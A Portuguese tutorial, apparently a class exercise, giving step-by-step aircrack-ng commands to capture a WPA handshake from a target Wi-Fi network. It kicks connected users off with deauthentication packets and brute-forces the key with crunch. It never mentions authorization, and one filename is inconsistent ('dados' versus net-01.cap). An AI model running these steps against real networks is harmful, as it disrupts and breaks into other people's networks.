<h1>Prática Ubuntu</h1>
<p>
Instale o aircrack-ng:
</p>

<p>
<pre><code>sudo apt-get update
sudo apt-get install aircrack-ng
</code></pre>
</p>

<p>
Verificar o nome da sua interface Wi-FI:
</p>

<p>
<pre><code>iwconfig
</code></pre>
</p>

<p>
Após verificar o nome da interface, deve-se verificar se o Ubuntu está reconhecendo o driver da interface sem fio:
</p>

<p>
<pre><code>sudo airmon-ng
</code></pre>
</p>

<p>
verificar se tem algum processo que pode acabar atrapalhando o processo de captura de pacotes:
</p>

<p>
<pre><code>sudo airmon-ng check kill
</code></pre>
</p>

<p>
Vamos colocar nossa placa de rede em modo monitor:
</p>

<p>
<pre><code>sudo airmon-ng start [nome_da_sua_interface_wireless]
iwconfig
</code></pre>
</p>

<p>
Quando a placa estiver pronta para monitorar, podemos ver quais são as redes disponíveis para nossos possíveis ataques.
</p>

<p>
<pre><code>sudo airodump-ng [nome_da_sua_interface_wireless]
</code></pre>

<p>
Após selecionar a rede alvo, utilizaremos algumas de suas informações. Você pode guardá-las em um bloco de notas. As informações são as seguintes:<br />
</p>
<ul>
<li><strong>BSSID:</strong> <em>Basic Service Set Identifier</em> se refere ao endereço MAC de um adaptador sem fio ou de um ponto de acesso.Sua função é identificar exclusivamente um ponto de acesso que enviará sinais pra transmissão da rede sem fio.</li>
<li><strong>CH:</strong> Canal na qual a rede está operando.</li>
<li><strong>ESSID:</strong> nome que é visível na rede.</li>
</ul>

<p>
Agora que temos a rede alvo, iremos monitorá-la usando algumas das informações adquiridas que guardamos em um bloco de notas anteriormente. É importante que pelo menos 300 pacotes de dados tenham passado pela rede para garantir que o <strong>WPA HANDSHAKE</strong> seja capturado.
<p>
<pre><code>sudo airodump-ng -c [canal_da_rede_alvo] --bssid [bssid_da_rede_alvo] -w dados
</code></pre>
</p>

<p>
Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é preciso que alguém se conecte à à rede. Há duas opções: você espera a oportunidade que algum usuário se conecte ou você pode desautenticar quem já está conectado e capturar o WPA HANDSHAKE logo que o usuário se reconectar. Usaremos a segunda opção!
<p>
<pre><code>sudo aireplay-ng -0 10 -a [bssid_da_rede_alvo] [nome_da_sua_interface_wireless]
</code></pre>
</p>

<p>
Verificar o <strong>WPA HANDSHAKE</strong> capturado no arquivo criado anteriormente na execução do comando de captura. No caso deste tutorial, o arquivo criado recebeu o nome “dados”. Dê o seguinte comando no seu diretório atual:
</p>
<pre><code>ls
sudo aircrack-ng net-01.cap
</code></pre>
</p>

<p>
Caso não já tenha instalado, será necessário a instalação do programa crunch:
</p>
<p>
<pre><code>sudo apt-get update
</code></pre>
</p>
<p>
<pre><code>sudo apt-get install crunch
</code></pre>
</p>

<p>
Hora de quebrar no Brute Force:
</p>
<p>
<pre><code>sudo crunch [min] [max] [padrão] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
</code></pre>
</p>

<p>
Você também pode usar o seguinte comando, caso deseje começar a busca a partir de uma determinada combinação dentro padrão.
</p>
<p>
<pre><code>sudo crunch [min] [max] [padrão] -s [combinação] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
</code></pre>
<p>
Ao final, temos de reativar o nosso network-manager pois ao usar o comando check kill ele o desativa.
</p>

<p>
<pre><code>sudo service network-manager start
</code></pre>
</p>
